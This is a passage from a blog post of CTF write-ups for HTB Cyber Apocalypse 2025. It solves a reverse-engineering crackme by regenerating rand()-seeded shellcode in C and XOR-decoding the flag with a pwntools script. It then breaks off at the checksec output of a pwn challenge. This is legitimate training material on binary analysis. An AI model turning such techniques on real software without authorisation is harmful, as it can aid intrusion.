<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>Ctf Htb Cyberapocalypse 2025 :: yocvito website</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Some write-ups for the HTB Cyberapocalypse 2025 CTF" />
<meta name="keywords" content="ctf, write-up, HTB-cyberapocalypse-2025, re, pwn" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:1313/posts/ctf-htb-cyberapocalypse-2025/" />





  
  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">

  
  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">







<link rel="shortcut icon" href="//localhost:1313/favicon.png">
<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Ctf Htb Cyberapocalypse 2025">
<meta property="og:description" content="Some write-ups for the HTB Cyberapocalypse 2025 CTF" />
<meta property="og:url" content="//localhost:1313/posts/ctf-htb-cyberapocalypse-2025/" />
<meta property="og:site_name" content="yocvito website" />

  
  
  <meta property="og:image" content="//localhost:1313/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-03-26 15:34:36 &#43;0100 CET" />












</head>
<body>


<div class="container">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    yocvito
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about/about">About</a></li>
        
      
        
          <li><a href="/posts">Blog</a></li>
        
      
        
          <li><a href="/projects">Projects</a></li>
        
      
        
          <li><a href="/about/resume">Resume / CV</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about/about" >About</a></li>
        
      
        
          <li><a href="/posts" >Blog</a></li>
        
      
        
          <li><a href="/projects" >Projects</a></li>
        
      
        
          <li><a href="/about/resume" >Resume / CV</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="//localhost:1313/posts/ctf-htb-cyberapocalypse-2025/">Ctf Htb Cyberapocalypse 2025</a>
  </h1>
  <div class="post-meta"><time class="post-date">2025-03-26</time><span class="post-author">yocvito</span></div>

  
    <span class="post-tags">
      
      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
      
      #<a href="//localhost:1313/tags/htb-cyberapocalypse-2025/">HTB-cyberapocalypse-2025</a>&nbsp;
      
      #<a href="//localhost:1313/tags/re/">re</a>&nbsp;
      
      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <p>We attempted this CTF as a team of 8 members, mainly not CTF players but with complementary skillset. This allows us to be ranked <strong>211th</strong> while not really try harding it.</p>
 <div class="custom-toc">
   <nav id="TableOfContents">
  <ul>
    <li><a href="#re---endless-cycle">RE - Endless Cycle</a>
      <ul>
        <li><a href="#analysis">Analysis</a></li>
      </ul>
    </li>
    <li><a href="#pwn---quack-quack">PWN - Quack Quack</a>
      <ul>
        <li><a href="#enumeration">Enumeration</a></li>
        <li><a href="#analysis-1">Analysis</a></li>
        <li><a href="#exploitation">Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#pwn---blessing">PWN - Blessing</a>
      <ul>
        <li><a href="#enumeration-1">Enumeration</a></li>
        <li><a href="#analysis-2">Analysis</a></li>
        <li><a href="#exploitation-1">Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#pwn---crossbow">PWN - Crossbow</a>
      <ul>
        <li><a href="#enumeration-2">Enumeration</a></li>
        <li><a href="#analysis-3">Analysis</a></li>
        <li><a href="#exploitation-2">Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#pwn---laconic">PWN - Laconic</a>
      <ul>
        <li><a href="#enumeration-3">Enumeration</a></li>
        <li><a href="#analysis-4">Analysis</a></li>
        <li><a href="#exploitation-3">Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#pwn---contractor">PWN - Contractor</a></li>
    <li><a href="#pwn---strategist">PWN - Strategist</a></li>
    <li><a href="#pwn---vault">PWN - Vault</a></li>
  </ul>
</nav>
 </div>


<h2 id="re---endless-cycle">RE - Endless Cycle<a href="#re---endless-cycle" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>We open the binary in IDA and look at the <code>main</code> function. It just <code>mmap</code> some memory, writes random values to it before executing that memory and looking if the return value is <code>1</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+0h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> j; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>mmaped; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  mmaped <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0x9EuLL</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">33</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0LL</span>);<span style="color:#75715e">// 7=PROT_ALL, 33=MAP_ANON|MAP_SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">srand</span>(seed);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x9D</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; j <span style="color:#f92672">&lt;</span> dword_4040[i]; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>    mmaped[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))mmaped)() <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You catch a brief glimpse of the Dragon&#39;s Heart - the truth has been revealed to you&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;The mysteries of the universe remain closed to you...&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We clearly see that the mmap-ed memory content is defined by the <code>seed</code> which is supplied to <code>srand()</code>. This value defines the sequence of random values that will be given by call to <code>rand()</code>. We also understand that the program drift the random sequence to only select the one values that interest it (the one that holds the instruction bytecode to write to the mmap-ed region).</p>
<p>Using this knowledge, we can craft a simple C program that will generate such code (we could also run the binary in a debugger, put a breakpoint before the final check and extract memory):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0CFD2BC5B</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> drifts[<span style="color:#ae81ff">158</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2a1</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x32e</span>, <span style="color:#ae81ff">0x167</span>, <span style="color:#ae81ff">0x251</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0x1e9</span>, <span style="color:#ae81ff">0x328</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x1a2</span>, <span style="color:#ae81ff">0x2e6</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x177</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x1cb</span>, <span style="color:#ae81ff">0x150</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0x15d</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x17c</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x2bf</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x340</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x178</span>, <span style="color:#ae81ff">0x19a</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x299</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x163</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x10e</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x22f</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x266</span>, <span style="color:#ae81ff">0x1dc</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x123</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x116</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0x253</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x305</span>, <span style="color:#ae81ff">0x124</span>, <span style="color:#ae81ff">0x244</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x1b1</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x2e7</span>, <span style="color:#ae81ff">0x3d7</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0x576</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x10f</span>, <span style="color:#ae81ff">0x1c5</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0x35c</span>, <span style="color:#ae81ff">0x20f</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x14e</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x104</span>, <span style="color:#ae81ff">0x1fe</span>, <span style="color:#ae81ff">0xf</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x233</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0x104</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x1c4</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0x1dc</span>, <span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x137</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x266</span>, <span style="color:#ae81ff">0x44d</span>, <span style="color:#ae81ff">0x183</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x16a</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x154</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0x12a</span>, <span style="color:#ae81ff">0x13f</span>, <span style="color:#ae81ff">0x2e2</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x100</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">srand</span>(seed);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x9D</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; j <span style="color:#f92672">&lt;</span> drifts[i]; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>	buf[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;endless-cycle-2nd-part.bin&#34;</span>, O_WRONLY<span style="color:#f92672">|</span>O_CREAT);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;open&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">write</span>(fd, buf, <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We compile this program, run it and get the 2nd part of the challenge to analyze:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./solve
</span></span><span style="display:flex;"><span>$ xxd endless-cycle-2nd-part.bin 
</span></span><span style="display:flex;"><span>00000000: <span style="color:#ae81ff">5548</span> 89e5 683e <span style="color:#ae81ff">2101</span> <span style="color:#ae81ff">0181</span> <span style="color:#ae81ff">3424</span> <span style="color:#ae81ff">0101</span> <span style="color:#ae81ff">0101</span>  UH..h&gt;!...4$....
</span></span><span style="display:flex;"><span>00000010: 48b8 <span style="color:#ae81ff">7468</span> <span style="color:#ae81ff">6520</span> 666c <span style="color:#ae81ff">6167</span> <span style="color:#ae81ff">5048</span> b857 <span style="color:#ae81ff">6861</span>  H.the flagPH.Wha
</span></span><span style="display:flex;"><span>00000020: <span style="color:#ae81ff">7420</span> <span style="color:#ae81ff">6973</span> <span style="color:#ae81ff">2050</span> 6a01 586a 015f 6a12 5a48  t is Pj.Xj._j.ZH
</span></span><span style="display:flex;"><span>00000030: 89e6 0f05 <span style="color:#ae81ff">4881</span> ec00 <span style="color:#ae81ff">0100</span> <span style="color:#ae81ff">0049</span> 89e4 31c0  ....H......I..1.
</span></span><span style="display:flex;"><span>00000040: 31ff 31d2 b601 4c89 e60f <span style="color:#ae81ff">0548</span> 85c0 7e32  1.1...L....H..~2
</span></span><span style="display:flex;"><span>00000050: 6a1a 584c 89e1 <span style="color:#ae81ff">4801</span> c881 31fe caef be48  j.XL..H...1....H
</span></span><span style="display:flex;"><span>00000060: 83c1 <span style="color:#ae81ff">0448</span> 39c1 72f1 4c89 e748 8d35 <span style="color:#ae81ff">1200</span>  ...H9.r.L..H.5..
</span></span><span style="display:flex;"><span>00000070: <span style="color:#ae81ff">0000</span> 48c7 c11a <span style="color:#ae81ff">0000</span> 00fc f3a6 0f94 c00f  ..H.............
</span></span><span style="display:flex;"><span>00000080: b6c0 c9c3 b69e adc5 92fa dfd5 a1a8 dcc7  ................
</span></span><span style="display:flex;"><span>00000090: cea4 8be1 8aa2 dce1 89fa 9dd2 9ab7 <span style="color:#ae81ff">0000</span>  ................
</span></span><span style="display:flex;"><span>000000a0: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
</span></span><span style="display:flex;"><span>000000b0: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
</span></span><span style="display:flex;"><span>000000c0: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
</span></span><span style="display:flex;"><span>000000d0: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
</span></span><span style="display:flex;"><span>000000e0: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
</span></span><span style="display:flex;"><span>000000f0: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ................
</span></span></code></pre></div><p>We can also open this raw binary in IDA to analyze it (make sure to select 64-bits arch). The code is pretty simple, it displays a message asking for the flag, retrieves the user input, and xor it with hardcoded values before comparing it to some memory values.</p>
<p><img alt="code 2nd part" src="/img/ctf-htb-cyberapo2025/endless-cycle-2nd-part-bin.png"></p>
<p>We dump the final password in IDA:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Python<span style="color:#f92672">&gt;</span> get_bytes(<span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">26</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb6\x9e\xad\xc5\x92\xfa\xdf\xd5\xa1\xa8\xdc\xc7\xce\xa4\x8b\xe1\x8a\xa2\xdc\xe1\x89\xfa\x9d\xd2\x9a\xb7</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><p>And it can be reversed easely with some python scripting:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;little&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb6\x9e\xad\xc5\x92\xfa\xdf\xd5\xa1\xa8\xdc\xc7\xce\xa4\x8b\xe1\x8a\xa2\xdc\xe1\x89\xfa\x9d\xd2\x9a\xb7</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>plain_chunked  <span style="color:#f92672">=</span> [p32(u32(passwd[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xbeefcafe</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(passwd), <span style="color:#ae81ff">4</span>)]
</span></span><span style="display:flex;"><span>plain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(plain_chunked)
</span></span><span style="display:flex;"><span>print(plain)
</span></span></code></pre></div><p>This gives us the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve.py
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;HTB{XXX}\xef\xbe&#39;</span>
</span></span></code></pre></div><h2 id="pwn---quack-quack">PWN - Quack Quack<a href="#pwn---quack-quack" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>The binary is dynamically linked and not stripped. It has various protections enabled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$  checksec quack_quack 
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
